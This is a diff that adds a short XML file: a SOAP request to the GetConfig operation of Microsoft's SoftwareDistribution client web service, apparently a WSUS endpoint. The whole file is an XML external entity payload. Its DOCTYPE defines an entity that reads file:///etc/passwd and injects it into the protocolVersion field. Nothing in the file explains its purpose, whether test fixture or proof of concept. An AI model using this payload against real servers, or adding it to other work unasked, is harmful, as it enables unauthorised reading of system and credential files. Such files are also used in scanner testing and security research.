@@ -1,0 +1,9 @@
+<?xml version="1.0"?>
+<!DOCTYPE soap:Envelope [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Body>
+    <GetConfig xmlns="http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService">
+      <protocolVersion>&xxe;</protocolVersion>
+    </GetConfig>
+  </soap:Body>
+</soap:Envelope>
